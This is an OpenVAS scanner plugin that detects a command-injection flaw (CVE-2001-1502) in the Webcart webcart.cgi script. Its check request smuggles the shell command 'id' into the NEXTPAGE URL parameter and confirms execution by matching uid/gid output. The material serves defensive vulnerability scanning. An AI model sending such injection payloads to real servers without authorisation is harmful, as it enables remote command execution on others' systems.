###############################################################################
# OpenVAS Vulnerability Test
#
# webcart.cgi
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11095");
  script_version("2020-08-25T06:50:30+0000");
  script_tag(name:"last_modification", value:"2020-08-25 06:50:30 +0000 (Tue, 25 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-1502");
  script_bugtraq_id(3453);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("webcart.cgi");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"webcart.cgi is installed and does not properly filter user input.");

  script_tag(name:"impact", value:"A cracker may use this flaw to execute any command on your system.");

  script_tag(name:"solution", value:"Upgrade your software or firewall your web server.");

  script_tag(name:"affected", value:"Webcart v.8.4 is known to be affected.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

http_check_remote_code(
                        extra_dirs:make_list("/webcart", "/cgi-bin/webcart"),
                        check_request:"/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;id|&CODE=PHOLD",
                        check_result:"uid=[0-9]+.* gid=[0-9]+.*",
                        command:"id"
                        );

exit( 99 );
